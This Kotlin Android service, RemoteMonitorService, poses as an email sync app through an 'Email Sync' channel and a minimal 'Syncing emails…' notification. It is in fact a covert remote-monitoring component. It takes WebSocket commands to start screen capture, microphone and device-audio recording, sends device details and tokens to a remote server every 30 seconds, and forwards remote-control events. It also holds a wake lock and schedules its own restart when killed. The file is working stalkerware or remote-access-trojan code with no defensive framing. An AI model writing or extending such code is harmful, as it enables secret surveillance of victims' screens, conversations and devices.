package com.email.service

import android.app.AlarmManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.os.SystemClock
import androidx.core.app.NotificationCompat
import com.email.MainActivity
import com.email.util.DeviceInfoUtil
import kotlinx.coroutines.*

class RemoteMonitorService : Service() {

    companion object {
        const val ACTION_START_SCREEN = "START_SCREEN"
        const val ACTION_STOP_SCREEN  = "STOP_SCREEN"
        const val ACTION_START_MIC    = "START_MIC"
        const val ACTION_STOP_MIC     = "STOP_MIC"
        const val ACTION_START_AUDIO  = "START_AUDIO"
        const val ACTION_STOP_AUDIO   = "STOP_AUDIO"
        const val ACTION_CONNECT      = "CONNECT"

        private const val CHANNEL_ID      = "email_sync_channel"
        private const val NOTIFICATION_ID = 1001
        private const val RESTART_RC      = 9901
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var prefs: SharedPreferences
    private lateinit var wsManager: WebSocketManager
    private var wakeLock: PowerManager.WakeLock? = null
    private var deviceInfoJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        // Channel must exist before startForeground
        createNotificationChannel()
        promoteForeground()

        prefs    = getSharedPreferences("email_prefs", Context.MODE_PRIVATE)
        wsManager = WebSocketManager.getInstance()

        acquireWakeLock()
        initWebSocket()
        startPeriodicDeviceInfo()
    }

    /** Call startForeground with the correct API-level form — wrapped in try/catch */
    private fun promoteForeground() {
        val notification = buildNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) { // API 29+
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            // If foreground start fails (e.g. MIUI restriction), keep running as background
            try { startForeground(NOTIFICATION_ID, notification) } catch (_: Exception) {}
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Re-promote in case we were demoted
        promoteForeground()

        when (intent?.action) {
            ACTION_START_SCREEN -> broadcastCommand("REQUEST_SCREEN_PERMISSION")
            ACTION_STOP_SCREEN  -> stopSafe(ScreenCaptureService::class.java)
            ACTION_START_MIC    -> startSafe(MicrophoneService::class.java)
            ACTION_STOP_MIC     -> stopSafe(MicrophoneService::class.java)
            ACTION_START_AUDIO  -> broadcastCommand("REQUEST_AUDIO_PERMISSION")
            ACTION_STOP_AUDIO   -> stopSafe(DeviceAudioService::class.java)
            ACTION_CONNECT      -> wsManager.connect()
        }
        return START_STICKY
    }

    private fun initWebSocket() {
        wsManager.apply {
            deviceId = prefs.getString("device_id", "unknown") ?: "unknown"
            fcmToken = prefs.getString("fcm_token", "") ?: ""
        }
        scope.launch {
            try {
                val info = DeviceInfoUtil.collectAsJson(applicationContext)
                val json = org.json.JSONObject(info)
                wsManager.deviceName     = json.optString("deviceName",      android.os.Build.MODEL)
                wsManager.model          = json.optString("model",           android.os.Build.MODEL)
                wsManager.androidVersion = json.optString("androidVersion",  android.os.Build.VERSION.RELEASE)
                wsManager.battery        = json.optInt("batteryLevel", 0)
                wsManager.storage        = json.optString("availableStorage", "0")
            } catch (_: Exception) {}
        }
        wsManager.onControlEvent = { json ->
            RemoteControlService.handleControlJson(applicationContext, json)
        }
        wsManager.connect()
    }

    private fun startPeriodicDeviceInfo() {
        deviceInfoJob = scope.launch {
            while (isActive) {
                delay(30_000)
                try {
                    wsManager.sendDeviceInfo(DeviceInfoUtil.collectAsJson(applicationContext))
                } catch (_: Exception) {}
            }
        }
    }

    private fun broadcastCommand(command: String) {
        sendBroadcast(Intent("com.email.COMMAND").apply {
            putExtra("command", command)
            setPackage(packageName)
        })
    }

    private fun startSafe(cls: Class<*>) {
        try { startService(Intent(this, cls)) } catch (_: Exception) {}
    }

    private fun stopSafe(cls: Class<*>) {
        try { stopService(Intent(this, cls)) } catch (_: Exception) {}
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK, "email::MonitorWakeLock"
            ).apply { acquire(10 * 60 * 1000L) }
        } catch (_: Exception) {}
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val ch = NotificationChannel(
                    CHANNEL_ID, "Email Sync", NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Keeps email synced in the background"
                    setShowBadge(false)
                }
                (getSystemService(NotificationManager::class.java)).createNotificationChannel(ch)
            } catch (_: Exception) {}
        }
    }

    private fun buildNotification() = NotificationCompat.Builder(this, CHANNEL_ID)
        .setContentTitle("Email")
        .setContentText("Syncing emails\u2026")
        .setSmallIcon(android.R.drawable.ic_dialog_email)
        .setPriority(NotificationCompat.PRIORITY_MIN)
        .setOngoing(true)
        .setContentIntent(
            PendingIntent.getActivity(
                this, 0,
                Intent(this, MainActivity::class.java),
                PendingIntent.FLAG_IMMUTABLE
            )
        )
        .build()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onTaskRemoved(rootIntent: Intent?) {
        scheduleRestart()
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        deviceInfoJob?.cancel()
        scope.cancel()
        try { wakeLock?.release() } catch (_: Exception) {}
        try { wsManager.disconnect() } catch (_: Exception) {}
        super.onDestroy()
        scheduleRestart()
    }

    private fun scheduleRestart() {
        try {
            val am = getSystemService(ALARM_SERVICE) as AlarmManager
            val pi = PendingIntent.getService(
                this, RESTART_RC,
                Intent(this, RemoteMonitorService::class.java),
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
            am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 3000L, pi)
        } catch (_: Exception) {}
    }
}
